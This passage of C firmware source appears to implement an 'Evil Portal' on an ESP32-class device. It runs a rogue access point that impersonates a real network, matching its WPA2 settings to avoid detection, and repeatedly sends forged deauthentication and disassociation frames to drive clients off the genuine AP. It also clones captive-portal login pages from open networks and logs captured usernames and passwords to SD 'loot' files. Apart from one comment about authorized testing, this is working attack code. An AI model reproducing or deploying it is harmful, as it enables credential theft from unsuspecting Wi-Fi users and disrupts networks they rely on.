// without saturating our own AP.
static volatile bool s_twin, s_twin_run;
static volatile bool s_twin_coherent;          // true = SoftAP brought up matching the real AP's WPA2 (no downgrade tell)
static uint8_t       s_twin_bssid[6];
static int           s_twin_channel;
static volatile unsigned long s_twin_frames;
static TaskHandle_t  s_twin_task;

static void twin_tx(uint8_t subtype)
{
    static const uint8_t BCAST[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
    uint8_t f[26] = { 0 };
    f[0] = subtype;                                    // 0xC0 deauth / 0xA0 disassoc
    memcpy(f + 4, BCAST, 6); memcpy(f + 10, s_twin_bssid, 6); memcpy(f + 16, s_twin_bssid, 6);
    f[24] = 0x07;                                      // reason: class-3 frame from nonassociated STA
    if (esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof f, false) == ESP_OK) s_twin_frames++;
}

static void twin_task(void *arg)
{
    (void)arg;
    while (s_twin_run) {
        for (int b = 0; b < 6 && s_twin_run; b++) { twin_tx(0xC0); twin_tx(0xA0); }
        vTaskDelay(pdMS_TO_TICKS(200));                // herd, don't starve our captive AP
    }
    s_twin_task = NULL;
    vTaskDelete(NULL);
}

static esp_err_t start_impl(const char *ssid, int template_idx, int channel,
                            bool twin, const uint8_t *bssid, wifi_auth_mode_t real_auth, bool coherent)
{
    if (s_running) return ESP_OK;
    if (!ssid || !ssid[0]) return ESP_ERR_INVALID_ARG;
    snprintf(s_cur_ssid, sizeof s_cur_ssid, "%s", ssid);
    s_captures = 0; s_last_user[0] = s_last_pass[0] = 0;
    s_recent_head = s_recent_total = 0;
    s_confirmed = 0; memset(s_seen, 0, sizeof s_seen); s_seen_head = 0;
    s_start_us = esp_timer_get_time();
    s_twin = false; s_twin_frames = 0; s_twin_coherent = false;

    // Dedicated mode FIRST: free httpd + mDNS + voice + ANIMA L1 (~70KB) so the ~64KB template buffer,
    // the captive httpd and the DNS task have room. exclusive never touches the STA — the radio is OURS
    // here (rogue AP), so we still suspend auto-reconnect and restore the saved network on exit (no NX_WIFI).
    nucleo_setup_suspend();
    nucleo_exclusive_info_t nxinf; nucleo_exclusive_enter(NX_NET_APP, &nxinf);
    ESP_LOGI(TAG, "exclusive: free=%u largest=%u", (unsigned)nxinf.free_after, (unsigned)nxinf.largest_after);

    if (!load_template(template_idx)) {
        ESP_LOGE(TAG, "template %d unavailable", template_idx);
        nucleo_setup_apply_network(); nucleo_exclusive_exit();   // network up first, then httpd/mDNS/voice
        return ESP_ERR_NOT_FOUND;
    }

    // Prepare loot storage (best-effort; failure just means no SD logging, the portal still runs).
    mkdir(PORTAL_DIR, 0775); mkdir(PORTAL_LOOT, 0775); mkdir(PORTAL_TPL, 0775);
    char ts[40]; timestamp(ts, sizeof ts);
    char safe[40]; int j = 0;
    for (const char *p = ts; *p && j < (int)sizeof(safe) - 1; p++) safe[j++] = (*p == ' ' || *p == ':') ? '-' : *p;
    safe[j] = 0;
    snprintf(s_logpath, sizeof s_logpath, "%s/session-%s.csv", PORTAL_LOOT, safe);

    // Coherent twin: when cloning an encrypted (non-PMF) AP, advertise the SAME WPA2 security so the
    // beacon identity matches the real one (kills the open-downgrade tell). OPEN/PMF targets stay open.
    bool make_wpa2 = twin && coherent && real_auth != WIFI_AUTH_OPEN && !auth_is_pmf(real_auth);
    s_twin_coherent = make_wpa2;

    esp_err_t err = start_ap(s_cur_ssid, channel, twin ? bssid : NULL, real_auth, make_wpa2);
    if (err != ESP_OK) { ESP_LOGE(TAG, "AP start failed: %s", esp_err_to_name(err)); nucleo_setup_apply_network(); nucleo_exclusive_exit(); return err; }
    offer_captive_dns();                    // DHCP hands clients 192.168.4.1 as their resolver

    s_dns_run = true;
    if (xTaskCreate(dns_task, "ep_dns", 3072, NULL, 5, &s_dns_task) != pdPASS) {
        ESP_LOGW(TAG, "captive DNS task failed to start (portal still serves on direct IP)");
        s_dns_run = false;
    }
    if (start_server() != ESP_OK) {
        ESP_LOGE(TAG, "portal HTTP server failed");
        s_dns_run = false;
        nucleo_setup_apply_network(); nucleo_exclusive_exit();   // network up first, then httpd/mDNS/voice
        return ESP_FAIL;
    }

    // Optional evil-twin: deauth the real AP we're impersonating to herd its clients onto us.
    if (twin && bssid) {
        memcpy(s_twin_bssid, bssid, 6);
        s_twin_channel = channel;
        s_twin = true; s_twin_run = true;
        if (xTaskCreate(twin_task, "ep_twin", 2048, NULL, 4, &s_twin_task) != pdPASS) {
            ESP_LOGW(TAG, "twin deauth task failed to start (portal still serves the clone)");
            s_twin_run = false; s_twin = false;
        }
    }

    s_running = true;
    ESP_LOGW(TAG, "Evil Portal ARMED: SSID='%s' ch=%d twin=%d loot=%s", s_cur_ssid, channel, (int)s_twin, s_logpath);
    return ESP_OK;
}

esp_err_t nucleo_evilportal_start(const char *ssid, int template_idx)
{
    return start_impl(ssid, template_idx, 1, false, NULL, WIFI_AUTH_OPEN, false);
}

esp_err_t nucleo_evilportal_start_twin(const char *ssid, int template_idx, const uint8_t bssid[6],
                                       int channel, int authmode, bool coherent)
{
    return start_impl(ssid, template_idx, channel, true, bssid, (wifi_auth_mode_t)authmode, coherent);
}

// ---- live captive-portal page cloning ---------------------------------------
// Join a nearby OPEN network, hit its captive-portal probe, and STREAM the served login HTML to SD
// as a new template (/sd/evilportal/portals/cloned.html). The portal's wildcard POST handler then
// captures whatever that page submits, so NO HTML rewriting is needed. AUTHORIZED testing only.
//
// RAM discipline (the hard constraint on this no-PSRAM chip): do ONE heavy thing at a time.
//   * take the heavy-work ARBITER token first -> serialized against ANIMA's online TLS (the mutex);
//   * enter EXCLUSIVE mode -> free ~70KB (httpd/mDNS/voice/L1) before we touch the network stack;
//   * STREAM the body through a 512 B stack buffer straight to SD -> the page is NEVER held in RAM;
//   * CAP the size -> a runaway/huge response can't exhaust the card or spin forever;
//   * a re-entrancy flag refuses a second concurrent clone.
#define CLONE_FILE   PORTAL_TPL "/cloned.html"
#define CLONE_MAXLEN (192 * 1024)            // a login page is small; refuse anything larger

static volatile bool s_cloning;

static esp_err_t clone_join_open(const char *ssid)   // associate + wait for an IP (≤ ~12 s)
{
    wifi_config_t sc = { 0 };
    snprintf((char *)sc.sta.ssid, sizeof sc.sta.ssid, "%s", ssid);
    sc.sta.threshold.authmode = WIFI_AUTH_OPEN;
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_set_config(WIFI_IF_STA, &sc);
    esp_wifi_start();
    esp_wifi_connect();
    esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    esp_netif_ip_info_t ip;
    for (int i = 0; i < 120; i++) {                  // up to 12 s, yielding so the WDT is fed
        if (sta && esp_netif_get_ip_info(sta, &ip) == ESP_OK && ip.ip.addr != 0) return ESP_OK;
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    return ESP_ERR_TIMEOUT;
}

// Returns bytes saved (>0) on success, or a negative error code (see header). Blocking ~≤20 s.
int nucleo_evilportal_clone_page(const char *open_ssid)
{
    if (s_running)                   return -1;      // portal up -> the radio is busy serving
    if (s_cloning)                   return -2;      // a clone is already in flight
    if (!open_ssid || !open_ssid[0]) return -3;

    uint32_t tok = nucleo_arb_acquire(ARB_FG, "ep-clone", 2000);
    if (!tok) return -4;                             // another heavy job (ANIMA TLS) holds the token
    s_cloning = true;

    nucleo_setup_suspend();                          // no auto-reconnect to home mid-clone
    nucleo_exclusive_enter(NX_NET_APP, NULL);        // free ~70KB; STA stays up (we need it to join)

    int rc = 0;
    if (clone_join_open(open_ssid) != ESP_OK) { rc = -10; goto done; }

    mkdir(PORTAL_DIR, 0775); mkdir(PORTAL_TPL, 0775);
    {
        // generate_204: 204 = real internet (no captive portal here); 200/redirect = a portal that
        // intercepts us. Auto-redirect on so a 302 is followed to the actual login page.
        esp_http_client_config_t hc = { 0 };
        hc.url            = "http://connectivitycheck.gstatic.com/generate_204";
        hc.timeout_ms     = 8000;
        hc.buffer_size    = 1024;
        hc.buffer_size_tx = 512;
        esp_http_client_handle_t cl = esp_http_client_init(&hc);
        if (!cl) { rc = -11; goto done; }
        if (esp_http_client_open(cl, 0) != ESP_OK) { esp_http_client_cleanup(cl); rc = -12; goto done; }
        esp_http_client_fetch_headers(cl);
        int status = esp_http_client_get_status_code(cl);
        if (status == 204 || status == 0) {          // no captive portal -> nothing to clone
            esp_http_client_close(cl); esp_http_client_cleanup(cl); rc = -13; goto done;
        }
        FILE *f = fopen(CLONE_FILE, "wb");
        if (!f) { esp_http_client_close(cl); esp_http_client_cleanup(cl); rc = -14; goto done; }
        char buf[512]; long total = 0; int n;
        while ((n = esp_http_client_read(cl, buf, sizeof buf)) > 0) {
            if (total + n > CLONE_MAXLEN) n = (int)(CLONE_MAXLEN - total);   // clamp the last chunk
            if (n <= 0) break;
            fwrite(buf, 1, n, f); total += n;
            if (total >= CLONE_MAXLEN) break;        // hit the cap -> stop
        }
        fclose(f);
        esp_http_client_close(cl); esp_http_client_cleanup(cl);
        if (total < 32) { remove(CLONE_FILE); rc = -15; goto done; }    // too small to be a real page
        rc = (int)total;                              // success
    }

done:
    esp_wifi_disconnect();
    nucleo_setup_apply_network();                    // restore the saved network (up first)
    nucleo_exclusive_exit();                         // restart httpd + mDNS + voice; L1 reloads lazily
    s_cloning = false;
    nucleo_arb_release(tok);
    return rc;
}

bool        nucleo_evilportal_cloning(void)    { return s_cloning; }
const char *nucleo_evilportal_clone_name(void) { return "cloned"; }   // template name after a clone

void nucleo_evilportal_stop(void)
{
    if (!s_running) return;
    s_running = false;

    if (s_twin_run) {                      // stop the evil-twin deauth task first
        s_twin_run = false;
        for (int i = 0; i < 30 && s_twin_task; i++) vTaskDelay(pdMS_TO_TICKS(25));
    }
    s_twin = false;

    if (s_portal) { httpd_stop(s_portal); s_portal = NULL; }
    s_dns_run = false;
    for (int i = 0; i < 30 && s_dns_task; i++) vTaskDelay(pdMS_TO_TICKS(50));   // let the DNS task exit

    free(s_tpl_html); s_tpl_html = NULL;

    // Put the factory AP MAC back so the OS AP isn't left wearing the spoofed BSSID after a session.
    uint8_t fac[6];
    if (esp_read_mac(fac, ESP_MAC_WIFI_SOFTAP) == ESP_OK) {
        esp_wifi_stop();
        esp_wifi_set_mac(WIFI_IF_AP, fac);
        esp_wifi_start();
    }
    nucleo_setup_apply_network();          // restore STA/AP from the saved config (network up first)
    nucleo_exclusive_exit();               // restart httpd + mDNS + voice; ANIMA L1 reloads lazily
    s_cur_ssid[0] = 0;
    ESP_LOGI(TAG, "Evil Portal disarmed; network + OS web UI restored");
}

bool        nucleo_evilportal_running(void)  { return s_running; }
bool          nucleo_evilportal_twin(void)         { return s_twin; }
bool          nucleo_evilportal_twin_coherent(void){ return s_twin_coherent; }
int           nucleo_evilportal_twin_channel(void) { return s_twin ? s_twin_channel : 0; }
unsigned long nucleo_evilportal_deauth_frames(void){ return s_twin_frames; }
const char *nucleo_evilportal_ssid(void)     { return s_cur_ssid; }
const char *nucleo_evilportal_logpath(void)  { return s_logpath; }
int         nucleo_evilportal_captures(void) { return s_captures; }
int         nucleo_evilportal_confirmed(void){ return s_confirmed; }

int nucleo_evilportal_clients(void)
{
    if (!s_running) return 0;
    wifi_sta_list_t list = { 0 };
    return (esp_wifi_ap_get_sta_list(&list) == ESP_OK) ? list.num : 0;
}

const char *nucleo_evilportal_last_user(void) { return s_last_user; }
const char *nucleo_evilportal_last_pass(void) { return s_last_pass; }

unsigned nucleo_evilportal_uptime_s(void)
{
    return s_running ? (unsigned)((esp_timer_get_time() - s_start_us) / 1000000) : 0;
}

int nucleo_evilportal_recent_count(void)
{
    int t = s_recent_total; return t < RECENT_N ? t : RECENT_N;
}
// i=0 -> most recent. Maps back through the ring head.
const char *nucleo_evilportal_recent_user(int i)
{
    int n = nucleo_evilportal_recent_count(); if (i < 0 || i >= n) return "";
    return s_recent_u[(s_recent_head - 1 - i + 2 * RECENT_N) % RECENT_N];
}
const char *nucleo_evilportal_recent_pass(int i)
{
    int n = nucleo_evilportal_recent_count(); if (i < 0 || i >= n) return "";
    return s_recent_p[(s_recent_head - 1 - i + 2 * RECENT_N) % RECENT_N];
}
